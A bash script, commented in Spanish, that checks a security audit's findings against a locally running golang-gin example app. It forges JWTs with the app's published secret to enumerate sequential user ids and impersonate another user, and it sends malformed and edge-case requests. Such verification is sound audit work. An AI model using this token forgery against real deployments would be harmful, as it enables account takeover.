#!/usr/bin/env bash
# Pruebas en vivo de los hallazgos más serios del repositorio golang-gin.
# Requisito: la app corriendo en http://localhost:8085 (ver la guía) y python en el PATH.
set -u
API=${API:-http://localhost:8085/api}
DIR=$(dirname "$0")
# forjar-jwt.py lee el secreto del clon del fork (no se copia en este repositorio)
export GOLANG_GIN_REPO=${GOLANG_GIN_REPO:-$DIR/../../../PruebaSimon-forks/golang-gin-realworld-example-app}
SUF=$RANDOM

echo "== Preparación: se registran dos usuarios, Alice y Bob"
curl -s -X POST "$API/users" -H 'Content-Type: application/json' \
  -d "{\"user\":{\"username\":\"alice$SUF\",\"email\":\"alice$SUF@demo.com\",\"password\":\"alicepass123\"}}" ; echo
BOB=$(curl -s -X POST "$API/users" -H 'Content-Type: application/json' \
  -d "{\"user\":{\"username\":\"bob$SUF\",\"email\":\"bob$SUF@demo.com\",\"password\":\"bobpass123\"}}")
echo "$BOB"
# Se adivina el id de Bob probando ids hasta encontrar su correo (los ids son secuenciales).
for id in $(seq 1 500); do
  T=$(python "$DIR/forjar-jwt.py" "$id")
  R=$(curl -s "$API/user" -H "Authorization: Token $T")
  if echo "$R" | grep -q "bob$SUF@demo.com"; then BOB_ID=$id; break; fi
done

echo
echo "== Prueba 1: suplantación con el secreto publicado (common/utils.go:41)"
echo "   Sin conocer la contraseña de Bob, se fabrica un token para el id $BOB_ID y se piden sus datos:"
T=$(python "$DIR/forjar-jwt.py" "$BOB_ID")
curl -s -w '\n   HTTP %{http_code}\n' "$API/user" -H "Authorization: Token $T"

echo
echo "== Prueba 2: JSON mal formado en el login (common/utils.go:71, conversión de tipo sin verificar)"
echo "   Lo esperado es 400 o 422; si sale 500, hubo un panic recuperado por Gin:"
curl -s -o /dev/null -w '   HTTP %{http_code}\n' -X POST "$API/users/login" \
  -H 'Content-Type: application/json' -d '{"user": {"email": '

echo
echo "== Prueba 3: token con el id como texto (users/middlewares.go:71, conversión de tipo sin verificar)"
T=$(python "$DIR/forjar-jwt.py" --texto "abc")
curl -s -o /dev/null -w '   HTTP %{http_code}\n' "$API/user" -H "Authorization: Token $T"

echo
echo "== Prueba 4: token válido de un usuario que no existe (users/middlewares.go:34, error de la base ignorado)"
echo "   Simula a un usuario dado de baja con su token aún vigente. Lo esperado es 401:"
T=$(python "$DIR/forjar-jwt.py" 999999)
curl -s -w '\n   HTTP %{http_code}\n' "$API/user" -H "Authorization: Token $T"

echo
echo "== Prueba 5: contraseña de más de 72 bytes (users/models.go:63, error de bcrypt ignorado)"
echo "   El validador acepta hasta 255 caracteres; bcrypt rechaza más de 72 y el error se descarta:"
P=$(printf 'a%.0s' $(seq 1 100))
curl -s -o /dev/null -w '   registro: HTTP %{http_code}\n' -X POST "$API/users" -H 'Content-Type: application/json' \
  -d "{\"user\":{\"username\":\"larga$SUF\",\"email\":\"larga$SUF@demo.com\",\"password\":\"$P\"}}"
curl -s -o /dev/null -w '   login con la misma contraseña: HTTP %{http_code} (la cuenta quedó bloqueada)\n' -X POST "$API/users/login" \
  -H 'Content-Type: application/json' -d "{\"user\":{\"email\":\"larga$SUF@demo.com\",\"password\":\"$P\"}}"
